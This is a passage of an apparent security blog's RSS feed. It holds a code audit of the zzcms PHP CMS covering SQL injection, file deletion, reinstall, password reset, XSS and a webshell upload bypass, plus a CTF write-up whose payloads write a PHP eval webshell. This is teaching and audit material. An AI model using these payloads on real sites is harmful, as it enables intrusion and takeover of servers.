<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Theoyu&#39;s Blog</title>
		<link>https://theoyu.top/posts/</link>
		<description>Recent content in Posts on Theoyu&#39;s Blog</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-cn</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Wed, 19 May 2021 19:25:18 +0800</lastBuildDate>
		<atom:link href="https://theoyu.top/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>zzcms code Audit</title>
			<link>https://theoyu.top/posts/codeaudit/zzcms/</link>
			<pubDate>Wed, 19 May 2021 19:25:18 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/codeaudit/zzcms/</guid>
			<description>准备工作 虽然事先准备审这个cms,但是找源码还是花了不少时间，官网只有最新的版本，这里如果大家想要复现就直接下载这里的就好了。
为了模拟真实环境，我们在phpstudy上配置一下站点,并修改hosts文件即可开始动手啦。
0x01 sql注入 进入界面,就有一个很明显的搜索框,我们尝试1&#39; or 1=1 #
发现单引号被转义，search.php包含了/inc/conn.php,而后者又包含了inc/stopsqlin.php，对应代码:
可以看到这里会对我们POST,GET以及COOKIE中的数据进行转义,那如果想要继续进行下去我们要么就是找到没有包含 /inc/conn.php的组件，要么就是找到拼接sql语句的地方。
user/check.php是对我们身份进行验证的文件，如果cookie设置有username和password，就会执行一次sql查询,并且该文件奇幻的是没有包含上面说的过滤文件，还自己写了一个过滤函数，还只对username进行过滤,那么我们尝试一下password处。
不过这个路由设有对验证码的识别，而user/index.php包含了该函数,那我们可以直接在index.php测试。
那么这里也理所当然可以通过盲注拿数据,不过我在本地搭建的环境比较慢，平均延迟在4秒左右，就没有跑了，师傅们见谅。
比较遗憾的是管理员路由设置的为session参数验证，无法通过万能密码的方法登陆。
0x02 任意文件删除 在user/adv.php处，
不得不说这种对$_REQUEST没有限制的代码真的很恐怖,逻辑其实很简单只要$action等于modify和$img不等于$oldimg即可，并且这里没有对$oldimg过滤导致我们可以直接把../../admin/admin.php删除。
0x03 网站重装 在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之后的文件都没有对其进行判断,并且step可控。
0x04 任意密码修改 漏洞点在one/getpassword.php
elseif($action==&amp;#34;step3&amp;#34; &amp;amp;&amp;amp; @$_SESSION[&amp;#39;username&amp;#39;]!=&amp;#39;&amp;#39;){ $passwordtrue = isset($_POST[&amp;#39;password&amp;#39;])?$_POST[&amp;#39;password&amp;#39;]:&amp;#34;&amp;#34;; $password=md5(trim($passwordtrue)); query(&amp;#34;update zzcms_user set password=&amp;#39;$password&amp;#39;,passwordtrue=&amp;#39;$passwordtrue&amp;#39; where username=&amp;#39;&amp;#34;.@$_SESSION[&amp;#39;username&amp;#39;].&amp;#34;&amp;#39;&amp;#34;); 利用样式和网址重装有些相似，也是POSTaction到step3直接修改密码,但这里需要我们知道被修改用户的$_SESSION[&#39;username&#39;],而在step1中我们可以看到：
if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; ...... $_SESSION[&#39;username&#39;]有一个被我们赋值的过程，那我们只需先在step1中输入需要修改的username获取session，就可直接跳到step3修改密码。步骤如下：
然后直接修改密码,把action改为step3即可。
0x05 反射型xss 在inc/top.php处没有包含inc/conn.php，我们只需要将标签闭合即可实现反射型xss。
事实上admin用户的后台管理基本上没有什么过滤，存在很多存储型xss,但归于业务原因, 拿到admin权限也就不在乎这个级别漏洞了,感兴趣的师傅可以自行复现。
0x06 上传webshell 在uploadimg_form.php可以文件上传，不过这个路由非常突兀让我有了一种好像做ctf题的感觉..
回到正题,我们看看后端是怎么处理我们的文件的:uploadimg.php
function upfile() { //是否存在文件 if (!is_uploaded_file(@$this-&amp;gt;fileName[tmp_name])){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp&amp;#39;);parent.window.close();&amp;lt;/script&amp;gt;&amp;#34;; exit; } //检查文件大小 if ($this-&amp;gt;max_file_size*1024 &amp;lt; $this-&amp;gt;fileName[&amp;#34;size&amp;#34;]){ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;文件大小超过了限制！最大只能上传 &amp;#34;.</description>
			<content type="html"><![CDATA[<h2 id="准备工作">准备工作</h2>
<p>虽然事先准备审这个cms,但是找源码还是花了不少时间，官网只有最新的版本，这里如果大家想要复现就直接下载这里的就好了。</p>
<p>为了模拟真实环境，我们在<strong>phpstudy</strong>上配置一下站点,并修改hosts文件即可开始动手啦。</p>
<h2 id="0x01-sql注入">0x01 sql注入</h2>
<p>进入界面,就有一个很明显的搜索框,我们尝试<code>1' or 1=1 #</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520195446877.png" alt="image-20210520195446877"></p>
<p>发现单引号被转义，<code>search.php</code>包含了<code>/inc/conn.php</code>,而后者又包含了<code>inc/stopsqlin.php</code>，对应代码:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520200128259.png" alt="image-20210520200128259"></p>
<p>可以看到这里会对我们<code>POST</code>,<code>GET</code>以及<code>COOKIE</code>中的数据进行转义,那如果想要继续进行下去我们要么就是找到没有包含 <code>/inc/conn.php</code>的组件，要么就是找到拼接sql语句的地方。</p>
<p><code>user/check.php</code>是对我们身份进行验证的文件，如果cookie设置有<code>username</code>和<code>password</code>，就会执行一次sql查询,并且该文件奇幻的是没有包含上面说的过滤文件，还自己写了一个过滤函数，还只对<code>username</code>进行过滤,那么我们尝试一下password处。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520201929542.png" alt="image-20210520201929542"></p>
<p>不过这个路由设有对验证码的识别，而<code>user/index.php</code>包含了该函数,那我们可以直接在<code>index.php</code>测试。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520203435308.png" alt="image-20210520203435308"></p>
<p>那么这里也理所当然可以通过盲注拿数据,不过我在本地搭建的环境比较慢，平均延迟在4秒左右，就没有跑了，师傅们见谅。</p>
<p>比较遗憾的是管理员路由设置的为<strong>session</strong>参数验证，无法通过万能密码的方法登陆。</p>
<h2 id="0x02-任意文件删除">0x02 任意文件删除</h2>
<p>在<code>user/adv.php</code>处，</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520205041873.png" alt="image-20210520205041873"></p>
<p>不得不说这种对<code>$_REQUEST</code>没有限制的代码真的很恐怖,逻辑其实很简单只要<code>$action</code>等于<strong>modify</strong>和<code>$img</code>不等于<code>$oldimg</code>即可，并且这里没有对<code>$oldimg</code>过滤导致我们可以直接把<code>../../admin/admin.php</code>删除。</p>
<h2 id="0x03-网站重装">0x03 网站重装</h2>
<p>在Install目录下，step1.php会首先判断是否存在install.lock文件，但是在step2.php及之后的文件都没有对其进行判断,并且step可控。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520205732410.png" alt="image-20210520205732410"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520210143862.png" alt="image-20210520210143862"></p>
<h2 id="0x04-任意密码修改">0x04 任意密码修改</h2>
<p>漏洞点在<code>one/getpassword.php</code></p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">elseif</span><span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&#34;step3&#34;</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">){</span>
<span class="nv">$passwordtrue</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
<span class="nv">$password</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$passwordtrue</span><span class="p">));</span>
<span class="nx">query</span><span class="p">(</span><span class="s2">&#34;update zzcms_user set password=&#39;</span><span class="si">$password</span><span class="s2">&#39;,passwordtrue=&#39;</span><span class="si">$passwordtrue</span><span class="s2">&#39; where username=&#39;&#34;</span><span class="o">.@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">);</span>
</code></pre></div><p>利用样式和网址重装有些相似，也是POST<strong>action</strong>到step3直接修改密码,但这里需要我们知道被修改用户的<code>$_SESSION['username']</code>,而在step1中我们可以看到：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nv">$action</span><span class="o">==</span><span class="s2">&#34;step1&#34;</span><span class="p">){</span>
<span class="nv">$username</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$username</span><span class="p">;</span>
<span class="o">......</span>
</code></pre></div><p><code>$_SESSION['username']</code>有一个被我们赋值的过程，那我们只需先在step1中输入需要修改的username获取session，就可直接跳到step3修改密码。步骤如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520221904775.png" alt="image-20210520221904775"></p>
<p>然后直接修改密码,把action改为step3即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520222027782.png" alt=""></p>
<h2 id="0x05-反射型xss">0x05 反射型xss</h2>
<p>在<code>inc/top.php</code>处没有包含<code>inc/conn.php</code>，我们只需要将标签闭合即可实现反射型xss。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520210717678.png" alt="image-20210520210717678"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520212245204.png" alt="image-20210520212245204"></p>
<p>事实上<code>admin</code>用户的后台管理基本上没有什么过滤，存在很多存储型xss,但归于业务原因, 拿到admin权限也就不在乎这个级别漏洞了,感兴趣的师傅可以自行复现。</p>
<h2 id="0x06-上传webshell">0x06 上传webshell</h2>
<p>在<code>uploadimg_form.php</code>可以文件上传，不过这个路由非常突兀让我有了一种好像做ctf题的感觉..</p>
<p>回到正题,我们看看后端是怎么处理我们的文件的:<code>uploadimg.php</code></p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">upfile</span><span class="p">()</span> <span class="p">{</span>
<span class="c1">//是否存在文件
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_uploaded_file</span><span class="p">(</span><span class="o">@</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="nx">tmp_name</span><span class="p">])){</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;请点击“浏览”，先选择您要上传的文件！</span><span class="se">\\</span><span class="s2">n</span><span class="se">\\</span><span class="s2">n支持的图片类型为：jpg,gif,png,bmp&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//检查文件大小
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">max_file_size</span><span class="o">*</span><span class="mi">1024</span> <span class="o">&lt;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;size&#34;</span><span class="p">]){</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;文件大小超过了限制！最大只能上传 &#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">max_file_size</span><span class="o">.</span><span class="s2">&#34; K的文件&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span><span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//检查文件类型
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;type&#34;</span><span class="p">],</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uptypes</span><span class="p">))</span> <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;文件类型错误，支持的图片类型为：jpg,gif,png,bmp&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span><span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//检查文件后缀
</span><span class="c1"></span><span class="nv">$hzm</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fileName</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">],</span><span class="s2">&#34;.&#34;</span><span class="p">)));</span><span class="c1">//获取.后面的后缀，如可获取到.php.gif
</span><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$hzm</span><span class="p">,</span><span class="s2">&#34;php&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$hzm</span><span class="p">,</span><span class="s2">&#34;asp&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span> <span class="o">||</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$hzm</span><span class="p">,</span><span class="s2">&#34;jsp&#34;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">){</span>
<span class="k">echo</span> <span class="s2">&#34;&lt;script&gt;alert(&#39;&#34;</span><span class="o">.</span><span class="nv">$hzm</span><span class="o">.</span><span class="s2">&#34;，这种文件不允许上传&#39;);parent.window.close();&lt;/script&gt;&#34;</span><span class="p">;</span><span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>首先判断是否存在文件,再判断文件大小，然后判断文件类型,这里用<strong>GIF89a</strong>可以绕过，最后是一个黑名单的后缀验证,我们使用phtml即可绕过。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520214742983.png" alt="image-20210520214742983"></p>
<p>需要注意的是，<code>phtml</code>需要管理员在apche配置中设置,不然会直接把源码打印没有解析,并且我在测试的过程中发现php7即使设置了解析,访问<code>.phtml</code>文件的效果是直接下载文件,而php5版本可以成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-20-image-20210520220014941.png" alt="image-20210520220014941"></p>
<h2 id="总结">总结</h2>
<p>虽然是入门级别的框架，但也来来回回审了两三天，不得不说代码审计一定需要静下心来看慢慢看。这个框架的漏洞利用点更多是在设计者本身对输入的过滤不严格所导致的，而且逻辑上也有很大的问题。之前在师傅博客看到这样一句话：<strong>知识面宽度决定攻击面广度,知识链深度决定攻击链的长度</strong>，虽然这是一次简单的白盒审计，不过也给黑盒测试提供了很多思路。</p>
<p>不过也是这次审计让我意识到自己对代码的敏感能力还是不够高，之前复现一些laravel和Yii的大型框架基本上都是拿着大师傅们的脚本直接打。学习还是一步一步好,戒骄戒躁。</p>
]]></content>
		</item>
		
		<item>
			<title>2021 WP汇总</title>
			<link>https://theoyu.top/posts/2021/</link>
			<pubDate>Mon, 17 May 2021 20:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/2021/</guid>
			<description>0x01 NEPCTF 周末比较忙，做了两道题。
little_trick &amp;lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&amp;#39;nep&amp;#39;]; $len = $_GET[&amp;#39;len&amp;#39;]; if(intval($len)&amp;lt;8 &amp;amp;&amp;amp; strlen($nep)&amp;lt;13){ eval(substr($nep,0,$len)); }else{ die(&amp;#39;too long!&amp;#39;); } ?&amp;gt;关于len这个点还挺好说的，-1就绕了，那么题目就变成了限制长度为12的命令执行。方法还挺多的。
solution 1 hitcon之前做了限制长度4或5的命令执行,4和5都可以了，那12自然不在话下，这里就不过多阐述了。
solution 2 事实上这题没那么麻烦，因为我们可控制字符还是比较长的，我们先测试一下:
?nep=`ls&amp;gt;z`;&amp;amp;len=7访问一下z我们发现了
index.phpnep.phpz很明显flag就在nep.php里，那只需
&amp;gt;cat *&amp;gt;z再访问z即可。
solution3 ?nep=`$_GET[a]`;1&amp;amp;len=-1&amp;amp;a=echo &amp;quot;&amp;lt;?php eval(\$_POST[theoyu]);&amp;quot;&amp;gt;theoyu.phpsolution4 这个是看一位老哥的wp时发现的，确实巧妙。 首先鉴于php的弱类型，intval会把字符串数字后给截断，导致比如7;agawg识别为7，然后里用?nep=$len达到内联执行的效果。
?nep=`$len`;&amp;amp;len=7;echo &amp;quot;&amp;lt;?php @eval(\$_POST[theoyu])?&amp;gt;&amp;quot; &amp;gt; theoyu.php梦里花开牡丹亭  考察php原生类的利用
 源码：
&amp;lt;?php highlight_file(__FILE__); error_reporting(0); include(&amp;#39;shell.php&amp;#39;); class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&amp;gt;username=&amp;#39;user&amp;#39;; $this-&amp;gt;password=&amp;#39;user&amp;#39;; } public function __wakeup(){ if(md5($this-&amp;gt;register)===&amp;#34;21232f297a57a5a743894a0e4a801fc3&amp;#34;){ $this-&amp;gt;choice=new login($this-&amp;gt;file,$this-&amp;gt;filename,$this-&amp;gt;content); }else{ $this-&amp;gt;choice = new register(); } } public function __destruct() { $this-&amp;gt;choice-&amp;gt;checking($this-&amp;gt;username,$this-&amp;gt;password); } } class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&amp;gt;file=$file; $this-&amp;gt;filename=$filename; $this-&amp;gt;content=$content; } public function checking($username,$password) { if($username===&amp;#39;admin&amp;#39;&amp;amp;&amp;amp;$password===&amp;#39;admin&amp;#39;){ $this-&amp;gt;file-&amp;gt;open($this-&amp;gt;filename,$this-&amp;gt;content); die(&amp;#39;login success you can to open shell file!</description>
			<content type="html"><![CDATA[<h2 id="0x01-nepctf">0x01 NEPCTF</h2>
<p>周末比较忙，做了两道题。</p>
<h3 id="little_trick">little_trick</h3>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
    <span class="nv">$nep</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;nep&#39;</span><span class="p">];</span>
    <span class="nv">$len</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;len&#39;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$len</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">8</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$nep</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">13</span><span class="p">){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$nep</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">));</span>
    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too long!&#39;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>关于<code>len</code>这个点还挺好说的，<strong>-1</strong>就绕了，那么题目就变成了<strong>限制长度为12</strong>的命令执行。方法还挺多的。</p>
<h4 id="solution-1">solution 1</h4>
<p>hitcon之前做了<strong>限制长度4或5的命令执行</strong>,4和5都可以了，那12自然不在话下，这里就不过多阐述了。</p>
<h4 id="solution-2">solution 2</h4>
<p>事实上这题没那么麻烦，因为我们可控制字符还是比较长的，我们先测试一下:</p>
<pre><code class="language-demo" data-lang="demo">?nep=`ls&gt;z`;&amp;len=7
</code></pre><p>访问一下<code>z</code>我们发现了</p>
<pre><code class="language-test" data-lang="test">index.php
nep.php
z
</code></pre><p>很明显flag就在<code>nep.php</code>里，那只需</p>
<pre><code>&gt;cat 
*&gt;z
</code></pre><p>再访问<code>z</code>即可。</p>
<h4 id="solution3">solution3</h4>
<pre><code class="language-demo" data-lang="demo">?nep=`$_GET[a]`;1&amp;len=-1&amp;a=echo &quot;&lt;?php eval(\$_POST[theoyu]);&quot;&gt;theoyu.php
</code></pre><h4 id="solution4">solution4</h4>
<p>这个是看一位老哥的wp时发现的，确实巧妙。
首先鉴于php的弱类型，<code>intval</code>会把字符串数字后给截断，导致比如<code>7;agawg</code>识别为7，然后里用?nep=<code>$len</code>达到内联执行的效果。</p>
<pre><code class="language-demo" data-lang="demo">?nep=`$len`;&amp;len=7;echo &quot;&lt;?php @eval(\$_POST[theoyu])?&gt;&quot; &gt; theoyu.php
</code></pre><h3 id="梦里花开牡丹亭">梦里花开牡丹亭</h3>
<blockquote>
<p>考察php原生类的利用</p>
</blockquote>
<p>源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="k">include</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">Game</span><span class="p">{</span>
    <span class="k">public</span>  <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$choice</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$register</span><span class="p">;</span>

    <span class="k">public</span>  <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span>  <span class="nv">$content</span><span class="p">;</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">register</span><span class="p">)</span><span class="o">===</span><span class="s2">&#34;21232f297a57a5a743894a0e4a801fc3&#34;</span><span class="p">){</span>    
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">=</span><span class="k">new</span> <span class="nx">login</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">register</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">choice</span><span class="o">-&gt;</span><span class="na">checking</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>
<span class="k">class</span> <span class="nc">login</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$content</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$content</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="nv">$file</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="nv">$filename</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="o">=</span><span class="nv">$content</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">checking</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="o">&amp;&amp;</span><span class="nv">$password</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">-&gt;</span><span class="na">open</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">);</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;login success you can to open shell file!&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">register</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">checking</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$username</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="o">&amp;&amp;</span><span class="nv">$password</span><span class="o">===</span><span class="s1">&#39;admin&#39;</span><span class="p">){</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;success register admin&#39;</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;please register admin &#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Open</span><span class="p">{</span>
    <span class="k">function</span> <span class="nf">open</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$content</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;waf.txt&#39;</span><span class="p">)){</span>    
            <span class="nx">shell</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
            <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>    
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span 